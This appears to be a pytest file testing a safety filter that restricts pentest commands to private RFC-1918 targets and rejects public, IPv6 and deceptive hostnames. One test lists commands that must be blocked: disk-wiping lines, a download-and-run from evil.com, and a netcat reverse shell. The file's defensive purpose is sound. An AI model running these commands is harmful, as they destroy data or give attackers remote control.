import pytest
from src.validation.safety_filter import SafetyFilter

def test_safety_filter_valid_private_ip():
    sf = SafetyFilter()
    passed, flags = sf.validate("nmap -sS 192.168.1.1", "192.168.1.1")
    assert passed is True
    assert len(flags) == 0

def test_safety_filter_blocked_dangerous_patterns():
    sf = SafetyFilter()
    dangerous_commands = [
        "rm -rf /",
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "wget http://evil.com/sh | bash",
        "nc -e /bin/sh 10.0.0.1 4444"
    ]
    for cmd in dangerous_commands:
        passed, flags = sf.validate(cmd, "192.168.1.1")
        assert passed is False
        assert any("BLOCKED" in f for f in flags)

def test_safety_filter_public_ip_blocked():
    sf = SafetyFilter()
    passed, flags = sf.validate("nmap -sS 8.8.8.8", "8.8.8.8")
    assert passed is False
    assert any("RFC-1918" in f for f in flags)

    passed_url, flags_url = sf.validate("curl http://8.8.8.8:80", "http://8.8.8.8:80")
    assert passed_url is False


def test_safety_filter_target_validation_cases():
    sf = SafetyFilter()

    # 1. Raw IPv6 addresses (Parsed cleanly but rejected under IPv4 private policy)
    passed, _ = sf.validate("nmap 10::1", "10::1")
    assert passed is False

    passed, _ = sf.validate("nmap ::1", "::1")
    assert passed is False

    # 2. Bracketed IPv6 URLs (Rejected)
    passed, _ = sf.validate("curl http://[::1]:8080/path", "http://[::1]:8080/path")
    assert passed is False

    # 3. Malformed bracketed URLs (Rejected cleanly without crashing)
    passed, _ = sf.validate("curl http://[invalid-bracketed-ipv6", "http://[invalid-bracketed-ipv6")
    assert passed is False

    # 4. Private IPv4 URLs with port/path (Allowed)
    passed, _ = sf.validate("gobuster dir -u http://192.168.1.50:8080/path", "http://192.168.1.50:8080/path")
    assert passed is True

    # 5. Valid private CIDR (Allowed)
    passed, _ = sf.validate("nmap 10.0.0.0/24", "10.0.0.0/24")
    assert passed is True

    # 6. Deceptive hostnames (Rejected)
    passed, _ = sf.validate("nmap 192.168.1.10.evil.com", "192.168.1.10.evil.com")
    assert passed is False

    passed_url, _ = sf.validate("gobuster dir -u http://192.168.1.10.evil.com", "http://192.168.1.10.evil.com")
    assert passed_url is False

